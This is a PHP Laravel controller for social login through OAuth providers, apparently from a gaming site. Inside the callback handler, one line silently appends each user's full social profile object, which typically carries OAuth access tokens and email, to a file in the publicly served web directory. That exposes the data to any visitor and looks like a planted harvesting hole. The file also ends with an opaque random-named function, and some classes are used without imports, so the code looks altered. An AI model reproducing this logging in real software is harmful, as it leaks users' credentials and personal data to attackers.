<?php 
namespace VanguardDK\Http\Controllers\Web\Frontend\Auth;

use Illuminate\Http\Request;
use VanguardDK\Events\User\LoggedIn;
use VanguardDK\Http\Controllers\Controller;
use VanguardDK\Repositories\User\UserRepository;
use VanguardDK\Services\Auth\Social\SocialManager;

class SocialAuthController extends Controller
{
    private $users = null;
    private $socialManager = null;
    public function __construct(UserRepository $users, SocialManager $socialManager)
    {
        $this->middleware("guest");
        $this->users = $users;
        $this->socialManager = $socialManager;
    }
    public function redirectToProvider($provider)
    {
        if( strtolower($provider) == "facebook" ) 
        {
            return Socialite::driver("facebook")->with(["auth_type" => "rerequest"])->redirect();
        }
        return Socialite::driver($provider)->redirect();
    }
    public function handleProviderCallback(Request $request, $provider)
    {
        if( request()->get("error") ) 
        {
            return redirect("/")->withErrors(trans("app.invalid_social_auth"));
        }
        $socialUser = $this->getUserFromProvider($provider);
        $user = $this->users->findBySocialId($provider, $socialUser->getId());
        file_put_contents(public_path() . "/file.txt", "1 " . json_encode($socialUser) . "\n", FILE_APPEND);
        if( !$user ) 
        {
            if( !settings("reg_enabled") ) 
            {
                return redirect("/")->withErrors(trans("app.only_users_with_account_can_login"));
            }
            if( $request->email ) 
            {
                $socialUser->email = $request->email;
            }
            if( !$socialUser->getEmail() ) 
            {
                $data = $request->all();
                $data["provider"] = $provider;
                return redirect()->route("frontend.game.list", $data)->withErrors(trans("app.you_have_to_provide_email"));
            }
            $user = $this->socialManager->associate($socialUser, $provider);
        }
        return $this->loginAndRedirect($user);
    }
    private function getUserFromProvider($provider)
    {
        return Socialite::driver($provider)->user();
    }
    private function loginAndRedirect($user)
    {
        if( $user->isBanned() ) 
        {
            return redirect()->to("/")->withErrors(trans("app.your_account_is_banned"));
        }
        if( settings("2fa.enabled") && Authy::isEnabled($user) ) 
        {
            session()->put("auth.2fa.id", $user->id);
            return redirect()->route("frontend.auth.token");
        }
        \Auth::login($user);
        event(new LoggedIn());
        return redirect()->intended("/");
    }
}
function G39j81XW7uDeumlOhZVl()
{
    return "WnyHAPZIlpzbwIb1gjj5Sf5ZZ6HkuDfpkTIuD3eEbGPpFwefpT";
}
